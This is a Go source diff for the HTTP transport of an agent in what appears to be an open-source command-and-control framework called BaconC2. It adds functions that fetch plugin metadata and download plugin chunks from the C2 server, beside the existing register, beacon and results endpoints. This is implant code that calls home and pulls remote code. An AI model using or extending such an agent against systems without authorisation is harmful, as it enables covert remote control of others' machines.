@@ -1,4 +1,4 @@
-package transport
+package http
 
 import (
 	"bytes"
@@ -8,6 +8,7 @@ import (
 	"net/http"
 	"time"
 
+	"github.com/RabbITCybErSeC/BaconC2/client/core/transport"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/logging"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
@@ -19,9 +20,11 @@ const (
 )
 
 const (
-	registerAPIPath = "%s/api/v1/agents/register"
-	beaconAPIPath   = "%s/api/v1/agents/beacon?id=%s"
-	resultsAPIPath  = "%s/api/v1/agents/results?id=%s"
+	registerAPIPath       = "%s/api/v1/agents/register"
+	beaconAPIPath         = "%s/api/v1/agents/beacon?id=%s"
+	resultsAPIPath        = "%s/api/v1/agents/results?id=%s"
+	pluginMetadataAPIPath = "%s/api/v1/agents/plugins/metadata?name=%s"
+	pluginChunkAPIPath    = "%s/api/v1/agents/plugins/chunk"
 )
 
 type HTTPClientTransport struct {
@@ -35,7 +38,7 @@ type HTTPClientTransport struct {
 	encoderChain   encoders.IChainEncoder
 }
 
-func NewHTTPClientTransport(serverURL, agentID string, commandQueue queue.ICommandQueue, resultQueue queue.IResultQueue, encoderChain encoders.IChainEncoder) ITransportProtocol {
+func NewHTTPClientTransport(serverURL, agentID string, commandQueue queue.ICommandQueue, resultQueue queue.IResultQueue, encoderChain encoders.IChainEncoder) transport.ITransportProtocol {
 	return &HTTPClientTransport{
 		serverURL:      serverURL,
 		agentID:        agentID,
@@ -197,4 +200,57 @@ func (t *HTTPClientTransport) Stop() error {
 
 func (t *HTTPClientTransport) GetBeaconInterval() time.Duration {
 	return t.beaconInterval
+}
+
+func (t *HTTPClientTransport) FetchPluginMetadata(pluginName string) (*models.PluginTransferMetadata, error) {
+	url := fmt.Sprintf(pluginMetadataAPIPath, t.serverURL, pluginName)
+
+	resp, err := t.httpClient.Get(url)
+	if err != nil {
+		return nil, fmt.Errorf("failed to fetch plugin metadata: %w", err)
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		body, _ := io.ReadAll(resp.Body)
+		return nil, fmt.Errorf("metadata fetch failed with status %d: %s", resp.StatusCode, string(body))
+	}
+
+	var metadata models.PluginTransferMetadata
+	if err := json.NewDecoder(resp.Body).Decode(&metadata); err != nil {
+		return nil, fmt.Errorf("failed to decode metadata: %w", err)
+	}
+
+	return &metadata, nil
+}
+
+func (t *HTTPClientTransport) FetchPluginChunk(pluginName string, chunkIndex int) (*models.PluginChunkResponse, error) {
+	req := models.PluginChunkRequest{
+		PluginName: pluginName,
+		ChunkIndex: chunkIndex,
+	}
+
+	jsonData, err := json.Marshal(req)
+	if err != nil {
+		return nil, fmt.Errorf("failed to marshal chunk request: %w", err)
+	}
+
+	url := fmt.Sprintf(pluginChunkAPIPath, t.serverURL)
+	resp, err := t.httpClient.Post(url, "application/json", bytes.NewBuffer(jsonData))
+	if err != nil {
+		return nil, fmt.Errorf("failed to fetch plugin chunk: %w", err)
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		body, _ := io.ReadAll(resp.Body)
+		return nil, fmt.Errorf("chunk fetch failed with status %d: %s", resp.StatusCode, string(body))
+	}
+
+	var chunk models.PluginChunkResponse
+	if err := json.NewDecoder(resp.Body).Decode(&chunk); err != nil {
+		return nil, fmt.Errorf("failed to decode chunk: %w", err)
+	}
+
+	return &chunk, nil
 }
